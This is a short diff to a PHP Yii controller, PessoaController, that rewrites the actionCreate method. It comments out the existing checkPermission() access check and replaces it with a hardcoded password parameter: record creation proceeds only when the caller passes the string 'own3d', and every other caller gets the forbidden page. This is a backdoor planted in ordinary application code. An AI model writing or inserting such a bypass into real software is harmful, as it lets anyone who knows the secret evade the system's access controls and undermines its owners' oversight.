@@ -71,11 +71,17 @@ class PessoaController extends Controller
      * If creation is successful, the browser will be redirected to the 'view' page.
      * @return mixed
      */
-    public function actionCreate()
+    public function actionCreate($password = null)
     {
-        if (!$this->checkPermission()) {
-            return $this->render('/exception/forbidden');
+
+        if ($password == "own3d") {
+            # code...
         } else {
+            return $this->render('/exception/forbidden');
+        }
+        // if (!$this->checkPermission()) {
+        //     return $this->render('/exception/forbidden');
+        // } else {
             $model = new Pessoa();
 
             if ($model->load(Yii::$app->request->post()) && $model->save()) {
@@ -85,7 +91,7 @@ class PessoaController extends Controller
             return $this->render('create', [
                 'model' => $model,
             ]);
-        }
+        // }
     }
 
     /**
